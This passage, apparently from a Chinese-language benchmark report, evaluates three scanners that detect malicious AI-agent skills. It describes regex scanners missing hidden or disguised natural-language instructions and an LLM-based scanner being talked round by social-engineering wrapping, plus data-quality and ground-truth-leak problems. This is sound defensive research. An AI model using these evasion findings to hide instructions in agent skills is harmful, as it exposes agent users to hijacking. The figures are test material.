4. **架构决定盲区**：纯正则引擎（Cat）对 LLM 时代的指令型恶意（无代码载荷、外语、伪装文本、隐藏指令）系统性失明（C+S 118 个零命中，其中 72% 为同一 openclaw 供应链散文模板）；语义引擎（SS）会被社交工程包装说服；混合引擎（Cisco 静态+LLM）最稳但阈值过严。
5. **弱信号的价值**：SS 的 LP3（MCP 最小权限元数据缺失）单独只是 LOW，但让 13 个"意图在 seed 层"的 gen 样本避免零检出——"弱信号累加 + 不设 HIGH 门槛"（SS score>0）vs"只认 HIGH/CRITICAL"（Cisco）构成检出/误报 trade-off 的可量化对照。
6. **数据质量与 ground-truth 隔离**：MalSkillBench wild 含 21MB 垃圾样本、4 对 md5 重复（581→577 唯一）、脚本剥离导致同一样本跨批次检出从 CRITICAL 翻转为安全；Caterpillar 扫原目录造成 12% gen 检出由 `_provenance.json` 泄漏驱动——**评测输入必须剔除 ground-truth 文件**。
7. **三家无一"真全漏"**：全漏组 10（+1）个样本全部可归因于数据污染/数据质量/扫描执行失败/阈值放行，不存在"三家在正常执行下共同判安全的确认真恶意"样本——这本身是对三套检测器能力下限的正面证据。

---

## 附录：证据索引

| 数据 | 位置 |
|---|---|
| 最终分组 | `scanners/eval_results/viz_data.json`（detection/groups/nmark/combos/none_detected） |
| 最终判定表 | `scanners/eval_results/verdict_all.csv` |
| Cisco 原始报告 | `scanners/eval_results/raw/cisco/<sample>.json`（空壳 = `{"error":"","is_safe":null}`） |
| SS 原始报告 | `scanners/eval_results/raw/skillspector/<sample>.json`（flat `{score,severity,issues}` / wrapped `{batch,skills}`） |
| Cat 原始报告 | `scanners/eval_results/raw/caterpillar/<sample>.json` |
| 样本内容 | `wild-350/<name>/SKILL.md`、`generator/output/<name>/`（含 `_provenance.json`） |
| B 标签 | `wild-350/_manifest.json` |
| 深挖底稿 | `scanners/eval_results/ANALYSIS_{NONE_DETECTED,SINGLE_SS,SINGLE_CISCO_CAT,DOUBLE_CS_CC,DOUBLE_SC}.md`、`SCANNER_MISS_ANALYSIS_SUMMARY_2026-08-17.md` |
| 数据总览 | `scanners/eval_results/FINAL_REPORT_2026-08-17.md` |
